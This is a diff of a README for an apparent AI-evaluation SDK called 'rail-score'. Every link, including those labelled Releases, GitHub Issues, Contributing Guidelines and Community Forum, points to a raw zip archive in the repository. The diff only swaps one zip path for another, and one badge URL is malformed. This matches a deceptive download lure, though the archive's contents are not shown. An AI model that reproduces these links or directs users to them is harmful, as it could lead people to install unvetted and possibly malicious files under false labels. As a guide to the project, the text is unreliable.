@@ -6,9 +6,9 @@ Welcome to **rail-score**, a Python SDK designed to help you evaluate and manage
 
 ## 📥 Download rail-score
 
-[![Download rail-score](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip%https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip)](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip)
+[![Download rail-score](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip%https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip)](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip)
 
-To get started, visit this page to download: [rail-score Releases](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip).
+To get started, visit this page to download: [rail-score Releases](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip).
 
 ## 📦 Features
 
@@ -30,7 +30,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To install **rail-score**, follow these steps:
 
-1. Visit the [rail-score Releases](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip) page.
+1. Visit the [rail-score Releases](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip) page.
 2. Locate the latest version of **rail-score**.
 3. Click on the download link for your operating system.
 4. Once the download is complete, follow these instructions:
@@ -52,7 +52,7 @@ For detailed usage instructions, refer to the documentation included in your ins
 
 ## 📝 Support & Feedback
 
-We want to hear from you! If you have questions or need assistance, please visit our GitHub Issues page [here](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip).
+We want to hear from you! If you have questions or need assistance, please visit our GitHub Issues page [here](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip).
 
 Your feedback helps us improve the application and user experience.
 
@@ -60,8 +60,8 @@ Your feedback helps us improve the application and user experience.
 
 Join our community to share your thoughts and experiences, or contribute to the project. You can help by reporting bugs, suggesting new features, or even helping with code.
 
-- Contribute on GitHub: [Contributing Guidelines](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip)
-- Share your experiences and join discussions in the [Community Forum](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip).
+- Contribute on GitHub: [Contributing Guidelines](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip)
+- Share your experiences and join discussions in the [Community Forum](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip).
 
 ## 📜 License
 
@@ -69,4 +69,4 @@ Join our community to share your thoughts and experiences, or contribute to the 
 
 ---
 
-Thank you for choosing **rail-score**! We hope it makes your AI evaluation process smoother and more effective. For further updates, keep checking our [Releases page](https://raw.githubusercontent.com/Linlichinese/rail-score/main/docs/rail-score-v3.8.zip).
+Thank you for choosing **rail-score**! We hope it makes your AI evaluation process smoother and more effective. For further updates, keep checking our [Releases page](https://raw.githubusercontent.com/Linlichinese/rail-score/main/examples/score_rail_v3.1.zip).
